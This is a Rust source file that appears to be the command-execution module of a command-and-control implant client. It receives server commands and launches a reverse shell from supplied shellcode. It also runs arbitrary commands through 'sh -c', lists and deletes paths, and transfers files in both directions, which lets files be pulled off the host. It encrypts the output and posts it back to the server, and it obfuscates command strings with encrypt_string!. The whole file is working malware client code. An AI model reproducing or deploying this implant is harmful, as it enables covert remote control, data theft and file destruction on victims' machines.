use cryptify::encrypt_string;
use log::{error, info};
use reqwest::Client;
use std::path::PathBuf;
use tokio::process::Command;

use crate::file_manager::ClientFileManager;
use crate::shell;
use common::crypto::Cipher;
use common::error::{C2Error, C2Result};
use common::message::{
    CommandRequest, CommandResponse, DeletePathResponse, EncryptedCommandResponse,
    FileOperationCommand, ListDirRequest, ListDirResponse, Message, MessageType,
};

/// Executes a command on the client.
/// Handles both regular commands and file operations like listing directories, deleting paths, downloading files, and uploading files.
pub async fn execute_command(
    http_client: &Client,
    server_url: &str,
    client_id: &str,
    cmd: CommandRequest,
    file_manager: &ClientFileManager,
) -> C2Result<()> {
    info!("Executing command: {}", cmd.command);

    // Handle reverse shell command first
    if cmd.command == encrypt_string!("REVERSE_SHELL") {
        if let Some(shellcode) = cmd.shellcode {
            info!("Received REVERSE_SHELL command with shellcode");
            return shell::start_reverse_shell(shellcode).await;
        } else {
            return Err(C2Error::Other(
                "Reverse shell command missing shellcode".into(),
            ));
        }
    }

    // Try to parse as FileOperationCommand first
    if cmd.args.len() >= 1 {
        if let Ok(file_op_cmd) =
            serde_json::from_slice::<FileOperationCommand>(&cmd.args[0].as_bytes())
        {
            match file_op_cmd {
                FileOperationCommand::ListDir(req) => {
                    info!("Listing directory: {}", req.path);
                    let result =
                        ClientFileManager::list_directory(&PathBuf::from(&req.path), req.recursive)
                            .await;
                    info!("Directory listing result: {:?}", result);

                    let response = match result {
                        Ok(entries) => {
                            info!("Found {} entries in directory {}", entries.len(), req.path);
                            ListDirResponse {
                                entries,
                                success: true,
                                message: "Directory listed successfully.".to_string(),
                            }
                        }
                        Err(e) => {
                            error!("Failed to list directory {}: {}", req.path, e);
                            ListDirResponse {
                                entries: Vec::new(),
                                success: false,
                                message: format!("Failed to list directory: {}", e),
                            }
                        }
                    };

                    send_file_operation_response(
                        http_client,
                        server_url,
                        client_id,
                        cmd.message_id
                            .clone()
                            .unwrap_or_else(|| "unknown".to_string()),
                        serde_json::to_vec(&response)?,
                    )
                    .await?;
                    return Ok(());
                }
                FileOperationCommand::DeletePath(req) => {
                    let result = ClientFileManager::delete_path(&PathBuf::from(req.path)).await;
                    let response = match result {
                        Ok(_) => DeletePathResponse {
                            success: true,
                            message: "Path deleted successfully.".to_string(),
                        },
                        Err(e) => DeletePathResponse {
                            success: false,
                            message: format!("Failed to delete path: {}", e),
                        },
                    };
                    send_file_operation_response(
                        http_client,
                        server_url,
                        client_id,
                        cmd.message_id
                            .clone()
                            .unwrap_or_else(|| "unknown".to_string()),
                        serde_json::to_vec(&response)?,
                    )
                    .await?;
                    return Ok(());
                }
                FileOperationCommand::DownloadInit(req) => {
                    // Download initiation request
                    let result = file_manager
                        .initiate_download(&PathBuf::from(req.path))
                        .await;
                    let response_payload = match result {
                        Ok(file_id) => serde_json::to_vec(
                            &serde_json::json!({"file_id": file_id, "success": true, "message": "Download initiated."}),
                        )?,
                        Err(e) => serde_json::to_vec(
                            &serde_json::json!({"success": false, "message": format!("Failed to initiate download: {}", e)}),
                        )?,
                    };
                    send_file_operation_response(
                        http_client,
                        server_url,
                        client_id,
                        cmd.message_id
                            .clone()
                            .unwrap_or_else(|| "unknown".to_string()),
                        response_payload,
                    )
                    .await?;
                    return Ok(());
                }
                FileOperationCommand::DownloadChunk(req) => {
                    // Download chunk request
                    let result = file_manager.get_next_download_chunk(&req.file_id).await;
                    let response_payload = match result {
                        Ok(Some(chunk)) => serde_json::to_vec(&chunk)?,
                        Ok(None) => serde_json::to_vec(
                            &serde_json::json!({"is_last": true, "message": "Download complete."}),
                        )?,
                        Err(e) => serde_json::to_vec(
                            &serde_json::json!({"success": false, "message": format!("Failed to get download chunk: {}", e)}),
                        )?,
                    };
                    send_file_operation_response(
                        http_client,
                        server_url,
                        client_id,
                        cmd.message_id
                            .clone()
                            .unwrap_or_else(|| "unknown".to_string()),
                        response_payload,
                    )
                    .await?;
                    return Ok(());
                }
                FileOperationCommand::UploadInit(req) => {
                    // Upload initiation
                    let result = file_manager
                        .initiate_upload(&PathBuf::from(req.path), &req.file_id)
                        .await;
                    let response_payload = match result {
                        Ok(_) => serde_json::to_vec(
                            &serde_json::json!({"success": true, "message": "Upload initiated."}),
                        )?,
                        Err(e) => serde_json::to_vec(
                            &serde_json::json!({"success": false, "message": format!("Failed to initiate upload: {}", e)}),
                        )?,
                    };
                    send_file_operation_response(
                        http_client,
                        server_url,
                        client_id,
                        cmd.message_id
                            .clone()
                            .unwrap_or_else(|| "unknown".to_string()),
                        response_payload,
                    )
                    .await?;
                    return Ok(());
                }
                FileOperationCommand::UploadChunk(chunk) => {
                    // Chunk upload
                    let result = file_manager
                        .write_file_chunk(&chunk.file_id.clone(), chunk)
                        .await;
                    let response_payload = match result {
                        Ok(_) => serde_json::to_vec(
                            &serde_json::json!({"success": true, "message": "Chunk uploaded."}),
                        )?,
                        Err(e) => serde_json::to_vec(
                            &serde_json::json!({"success": false, "message": format!("Failed to upload chunk: {}", e)}),
                        )?,
                    };
                    send_file_operation_response(
                        http_client,
                        server_url,
                        client_id,
                        cmd.message_id
                            .clone()
                            .unwrap_or_else(|| "unknown".to_string()),
                        response_payload,
                    )
                    .await?;
                    return Ok(());
                }
            }
        }
    }

    // Only keep ListDir for backward compatibility, remove other duplicated operations
    match cmd.command.as_str() {
        "ListDir" => {
            // Keep this for backward compatibility only
            let req: ListDirRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
            info!("Listing directory: {}", req.path);
            let result =
                ClientFileManager::list_directory(&PathBuf::from(&req.path), req.recursive).await;

            let response = match result {
                Ok(entries) => {
                    info!("Found {} entries in directory {}", entries.len(), req.path);
                    ListDirResponse {
                        entries,
                        success: true,
                        message: "Directory listed successfully.".to_string(),
                    }
                }
                Err(e) => {
                    error!("Failed to list directory {}: {}", req.path, e);
                    ListDirResponse {
                        entries: Vec::new(),
                        success: false,
                        message: format!("Failed to list directory: {}", e),
                    }
                }
            };

            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                cmd.message_id
                    .clone()
                    .unwrap_or_else(|| "unknown".to_string()),
                serde_json::to_vec(&response)?,
            )
            .await?;
        }
        _ => {
            // Original command execution logic for non-file operations
            let output = Command::new("sh")
                .arg("-c")
                .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
                .output()
                .await?;

            let result = CommandResponse {
                client_id: client_id.to_string(),
                command: cmd.command.clone(),
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                exit_code: output.status.code().unwrap_or(-1),
                executed_at: chrono::Utc::now(),
            };

            send_command_result(http_client, server_url, result).await?;
        }
    }
    Ok(())
}

/// Sends the command execution result back to the server.
/// Encrypts sensitive data before sending.
async fn send_command_result(
    http_client: &Client,
    server_url: &str,
    result: CommandResponse,
) -> C2Result<()> {
    // Create encryption key (should be read from config)
    let key = b"your-32-byte-secret-key-here!!!!"; // 32 bytes
    let cipher = Cipher::new(key);

    // Encrypt the sensitive data (stdout, stderr, command)
    let sensitive_data = serde_json::json!({
        "command": result.command,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.exit_code
    });

    let encrypted_data = cipher
        .encrypt(sensitive_data.to_string().as_bytes())
        .map_err(|e| C2Error::Other(format!("Encryption failed: {}", e)))?;

    // Create encrypted response
    let encrypted_response = EncryptedCommandResponse {
        client_id: result.client_id,
        encrypted_data,
        executed_at: result.executed_at,
    };

    let payload = serde_json::to_vec(&encrypted_response)?;
    let message = Message::new(MessageType::CommandResult, payload);

    http_client
        .post(format!("{server_url}/api/command_result"))
        .json(&message)
        .send()
        .await?;
    Ok(())
}

/// Sends a file operation response back to the server.
async fn send_file_operation_response(
    http_client: &Client,
    server_url: &str,
    client_id: &str,
    message_id: String,
    payload: Vec<u8>,
) -> C2Result<()> {
    info!(
        "Sending file operation response for client {} with payload size: {}",
        client_id,
        payload.len()
    );
    let mut message = Message::new(MessageType::FileOperationResponse, payload);
    message.id = message_id; // Use the original request message ID

    let response = http_client
        .post(format!(
            "{server_url}/api/file_operation_response/{}",
            client_id
        ))
        .json(&message)
        .send()
        .await?;

    if !response.status().is_success() {
        error!(
            "Failed to send file operation response: {}",
            response.status()
        );
        return Err(C2Error::Network(format!(
            "HTTP error: {}",
            response.status()
        )));
    }

    info!(
        "Successfully sent file operation response for client {}",
        client_id
    );
    Ok(())
}
